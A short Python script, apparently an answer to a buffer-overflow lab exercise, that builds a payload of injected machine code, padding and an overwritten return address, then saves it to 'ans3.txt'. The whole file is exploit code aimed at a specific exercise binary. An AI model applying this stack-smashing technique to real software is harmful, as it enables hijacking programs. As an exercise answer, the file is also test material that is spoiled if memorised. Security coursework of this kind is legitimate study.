import struct

# 准备机器码
shellcode = b'\xbf\x72\x00\x00\x00' + b'\xb8\x16\x12\x40\x00' + b'\xff\xd0'

# 缓冲区总长是 40 字节
total_buffer_len = 40
padding_len = total_buffer_len - len(shellcode)

# 设置跳转地址，覆盖返回地址，让它跳去 jmp_xs 
jmp_xs_addr = 0x401334

# 组合 Payload —— [Shellcode] + [垃圾填充] + [jmp_xs地址]
payload = shellcode + (b'A' * padding_len) + struct.pack('<Q', jmp_xs_addr)

with open("ans3.txt", "wb") as f:
    f.write(payload)

print(f"Payload generated! Shellcode length: {len(shellcode)}")